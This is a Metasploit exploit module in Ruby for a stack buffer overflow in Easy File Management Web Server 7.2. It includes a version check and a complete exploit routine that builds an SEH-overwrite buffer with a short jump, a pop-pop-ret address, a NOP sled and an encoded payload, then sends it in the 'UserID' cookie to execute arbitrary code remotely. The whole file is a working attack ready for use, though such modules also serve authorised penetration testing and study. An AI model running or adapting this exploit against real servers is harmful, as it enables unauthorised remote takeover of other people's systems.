##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking # Reliable memory corruption

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Easy File Management Web Server 7.2 Stack Buffer Overflow (SEH)',
      'Description'    => %q{
        Easy File Management Web Server v7.2 contains a buffer overflow which
        can be exploited by a remote attacker sending an HTTP request containing
        a specially crafted "UserID" cookie in order to execute arbitrary code.
      },
      'Author'         =>
        [
          'Audit0r',    # Vulnerability discovery
          'meik',       # Exploit and MSF module
        ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          ['EDB',   '38526'],
          ['URL',   'http://www.web-file-management.com/']
        ],
      'Platform'       => 'win',
      'Arch'           => ARCH_X86,
      'DefaultOptions' =>
        {
          'EXITFUNC'   => 'process'
        },
      'Payload'        =>
        {
          'BadChars'   => "\x00\x0a\x0d\x3b",
          'Space'      => 5000
        },
      'Targets'        =>
        [
          ['Easy File Sharing Web Server 7.2', { 'Ret' => 0x100102A3 }],
        ],
      'DisclosureDate' => 'Nov 30 2015',
      'DefaultTarget'  => 0))

      register_options(
        [
          OptString.new('TARGETURI', [true, 'The URI path of an existing resource', '/changeuser.ghp'])
        ], self.class)
  end

  def get_version
    version = nil
    res = send_request_raw({'uri' => '/whatsnew.txt'})
    if res && res.body =~ /What's new in Easy File Management Web Server V(\d\.\d)/
      version = $1
      vprint_status "#{peer} - Found version: #{version}"
    end

    version
  end


  # check whether it's vulnerable...doesn't work very well
  def check
    code = Exploit::CheckCode::Safe
    version = get_version
    if version.nil?
      code = Exploit::CheckCode::Unknown
    elsif version == "7.2"
      code = Exploit::CheckCode::Appears
    end

    code
  end

  def exploit

    sploit = rand_text(4059)            # SEH at 4059 + 4
    sploit << "\xeb\x06\x90\x90"        # next SEH replaced by jmp short +6
    sploit << [target.ret].pack('V')    # SEH replaced by address of pop pop ret
    sploit << make_nops(929)            # a bunch of nops for teh fun
    sploit << payload.encoded           # our payload

    send_request_cgi({
      'uri'    => normalize_uri(target_uri.path),
      'cookie' => "SESSIONID=; UserID=#{sploit}; PassWD=;",
    }, 1)
  end
end
